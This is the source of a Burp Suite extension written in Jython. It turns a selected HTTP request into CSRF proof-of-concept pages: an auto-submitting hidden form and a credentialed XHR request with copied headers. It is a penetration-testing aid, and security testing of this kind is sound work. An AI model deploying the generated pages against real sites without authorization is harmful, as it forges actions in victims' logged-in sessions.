# CSRF PoC Builder for Burp Suite
# Load this file in Burp: Extensions -> Installed -> Add -> Extension type: Python.
# Requires Burp's Jython support.

import json

try:
    from urlparse import parse_qsl
except ImportError:
    from urllib.parse import parse_qsl

from burp import IBurpExtender, IContextMenuFactory

from java.awt import BorderLayout, Dimension, Font, Toolkit
from java.awt.datatransfer import StringSelection
from java.io import PrintWriter
from java.lang import Runnable
from java.util import Arrays
from javax.swing import JButton, JFrame, JLabel, JMenuItem, JPanel, JScrollPane
from javax.swing import JTabbedPane, JTextArea, SwingUtilities


try:
    text_type = unicode
except NameError:
    text_type = str


class _RunLater(Runnable):
    def __init__(self, callback):
        self._callback = callback

    def run(self):
        self._callback()


class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        callbacks.setExtensionName("CSRF PoC Builder")
        callbacks.registerContextMenuFactory(self)
        self._stdout.println("[CSRF PoC Builder] Loaded. Right-click a request and choose Make CSRF PoC.")

    def createMenuItems(self, invocation):
        messages = invocation.getSelectedMessages()
        if messages is None or len(messages) == 0:
            return None

        item = JMenuItem("Make CSRF PoC")
        item.addActionListener(lambda event, message=messages[0]: self._handle_message(message))
        return [item]

    def _handle_message(self, message):
        try:
            request = message.getRequest()
            if request is None:
                return

            analyzed = self._helpers.analyzeRequest(message)
            url = analyzed.getUrl()
            method = analyzed.getMethod().upper()
            headers = list(analyzed.getHeaders())
            body_offset = analyzed.getBodyOffset()
            body_bytes = Arrays.copyOfRange(request, body_offset, len(request))
            body = self._helpers.bytesToString(body_bytes)

            context = {
                "url": url,
                "url_text": url.toString(),
                "action_no_query": self._url_without_query(url),
                "action_full": self._url_without_fragment(url),
                "method": method,
                "headers": headers,
                "body": body,
                "content_type": self._header_value(headers, "Content-Type"),
                "parameters": list(analyzed.getParameters())
            }

            form_html = self._build_form_poc(context)
            xhr_html = self._build_xhr_poc(context)
            self._show_window(context["url_text"], form_html, xhr_html)
        except Exception as exc:
            self._stderr.println("[CSRF PoC Builder] Error: %s" % exc)

    def _build_form_poc(self, context):
        method = context["method"]
        content_type = context["content_type"].lower()
        note = ""
        enctype = ""
        action = context["action_full"]
        form_method = "POST"
        fields = []

        if method == "GET":
            form_method = "GET"
            action = context["action_no_query"]
            fields = self._query_params(context["url"])
        elif method == "POST":
            if "application/x-www-form-urlencoded" in content_type:
                fields = self._parse_pairs(context["body"])
            elif "multipart/form-data" in content_type:
                enctype = ' enctype="multipart/form-data"'
                fields = self._body_parameters(context["parameters"])
                note = "Multipart file content cannot be recreated by hidden inputs; review before using."
            elif "text/plain" in content_type:
                enctype = ' enctype="text/plain"'
                fields = self._parse_pairs(context["body"])
                if len(fields) == 0 and context["body"].strip():
                    note = "Raw text bodies may not be reproduced exactly by a plain HTML form. Use the XHR tab for exact body bytes."
            elif context["body"].strip():
                note = "This request uses a raw body such as JSON or XML. Plain HTML forms cannot send that exact Content-Type. Use the XHR tab for the exact request."
        else:
            note = "Original method was %s. Plain HTML forms only support GET and POST. Use the XHR tab for the exact method." % method

        inputs = []
        for name, value in fields:
            inputs.append('    <input type="hidden" name="%s" value="%s">' % (
                self._html_escape(name),
                self._html_escape(value)
            ))

        if len(inputs) == 0:
            inputs.append("    <!-- No form-compatible parameters were detected. -->")

        note_html = ""
        if note:
            note_html = '  <p style="font-family: sans-serif; color: #7a3f00;">%s</p>\n' % self._html_escape(note)

        html = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - Form</title>
</head>
<body>
%s  <form id="csrf" action="%s" method="%s"%s>
%s
    <input type="submit" value="Submit request">
  </form>
  <script>
    document.getElementById("csrf").submit();
  </script>
</body>
</html>
""" % (
            note_html,
            self._html_escape(action),
            self._html_escape(form_method),
            enctype,
            "\n".join(inputs)
        )
        return html

    def _build_xhr_poc(self, context):
        method = context["method"]
        headers, skipped = self._javascript_headers(context["headers"])
        header_lines = []

        for name in sorted(headers.keys()):
            header_lines.append("    xhr.setRequestHeader(%s, %s);" % (
                self._js_quote(name),
                self._js_quote(headers[name])
            ))

        if len(header_lines) == 0:
            header_lines.append("    // No browser-settable headers copied from the original request.")

        skipped_text = ""
        if len(skipped) > 0:
            skipped_text = "\n  <p>Skipped browser-forbidden headers: %s</p>" % self._html_escape(", ".join(skipped))

        body_send = "    xhr.send();"
        if method not in ("GET", "HEAD") and len(context["body"]) > 0:
            body_send = "    xhr.send(%s);" % self._js_quote(context["body"])

        html = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSRF PoC - XHR With Headers</title>
</head>
<body>
  <p>XHR PoC. Cookies are handled by <code>withCredentials</code> when browser SameSite and CORS rules allow it.</p>%s
  <pre id="result"></pre>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.open(%s, %s, true);
    xhr.withCredentials = true;
%s
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4) {
        document.getElementById("result").textContent = "Status: " + xhr.status + "\\n" + xhr.responseText;
      }
    };
    xhr.onerror = function () {
      document.getElementById("result").textContent = "Request sent or blocked by browser policy. Check the target and console.";
    };
%s
  </script>
</body>
</html>
""" % (
            skipped_text,
            self._js_quote(method),
            self._js_quote(context["url_text"]),
            "\n".join(header_lines),
            body_send
        )
        return html

    def _show_window(self, url_text, form_html, xhr_html):
        def build():
            frame = JFrame("CSRF PoC Builder - %s" % url_text)
            frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE)
            frame.setMinimumSize(Dimension(950, 650))

            tabs = JTabbedPane()
            tabs.addTab("No Headers Form", self._code_panel(form_html))
            tabs.addTab("With Headers XHR", self._code_panel(xhr_html))

            frame.getContentPane().add(tabs, BorderLayout.CENTER)
            frame.pack()
            frame.setLocationRelativeTo(None)
            frame.setVisible(True)

        SwingUtilities.invokeLater(_RunLater(build))

    def _code_panel(self, code):
        panel = JPanel(BorderLayout())
        area = JTextArea(code)
        area.setLineWrap(False)
        area.setFont(Font("Monospaced", Font.PLAIN, 12))
        area.setCaretPosition(0)

        copy_button = JButton("Copy HTML")
        copy_button.addActionListener(lambda event, text_area=area: self._copy_to_clipboard(text_area.getText()))

        bar = JPanel(BorderLayout())
        bar.add(JLabel("Generated HTML"), BorderLayout.WEST)
        bar.add(copy_button, BorderLayout.EAST)

        panel.add(bar, BorderLayout.NORTH)
        panel.add(JScrollPane(area), BorderLayout.CENTER)
        return panel

    def _copy_to_clipboard(self, text):
        selection = StringSelection(text)
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(selection, selection)

    def _header_value(self, headers, name):
        prefix = name.lower() + ":"
        for header in headers[1:]:
            if header.lower().startswith(prefix):
                return header.split(":", 1)[1].strip()
        return ""

    def _javascript_headers(self, headers):
        copied = {}
        skipped = []
        for header in headers[1:]:
            if ":" not in header:
                continue
            name, value = header.split(":", 1)
            name = name.strip()
            value = value.strip()
            if self._is_forbidden_js_header(name):
                skipped.append(name)
                continue
            copied[name] = value
        return copied, skipped

    def _is_forbidden_js_header(self, name):
        lower = name.lower()
        forbidden = set([
            "accept-charset",
            "accept-encoding",
            "access-control-request-headers",
            "access-control-request-method",
            "connection",
            "content-length",
            "cookie",
            "cookie2",
            "date",
            "dnt",
            "expect",
            "host",
            "keep-alive",
            "origin",
            "referer",
            "te",
            "trailer",
            "transfer-encoding",
            "upgrade",
            "user-agent",
            "via"
        ])
        return lower in forbidden or lower.startswith("proxy-") or lower.startswith("sec-")

    def _query_params(self, url):
        query = url.getQuery()
        if query is None:
            return []
        return self._parse_pairs(query)

    def _parse_pairs(self, text):
        try:
            return [(name, value) for name, value in parse_qsl(text, True)]
        except Exception:
            return []

    def _body_parameters(self, parameters):
        result = []
        for parameter in parameters:
            if parameter.getType() in (1, 5):
                result.append((parameter.getName(), parameter.getValue()))
        return result

    def _url_without_query(self, url):
        port = url.getPort()
        port_text = "" if port == -1 else ":%s" % port
        path = url.getPath()
        if path is None or path == "":
            path = "/"
        return "%s://%s%s%s" % (url.getProtocol(), url.getHost(), port_text, path)

    def _url_without_fragment(self, url):
        port = url.getPort()
        port_text = "" if port == -1 else ":%s" % port
        file_part = url.getFile()
        if file_part is None or file_part == "":
            file_part = "/"
        return "%s://%s%s%s" % (url.getProtocol(), url.getHost(), port_text, file_part)

    def _html_escape(self, value):
        value = self._to_text(value)
        return (value
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#039;"))

    def _js_quote(self, value):
        quoted = json.dumps(self._to_text(value))
        return quoted.replace("</", "<\\/")

    def _to_text(self, value):
        if value is None:
            return ""
        if isinstance(value, text_type):
            return value
        return text_type(value)
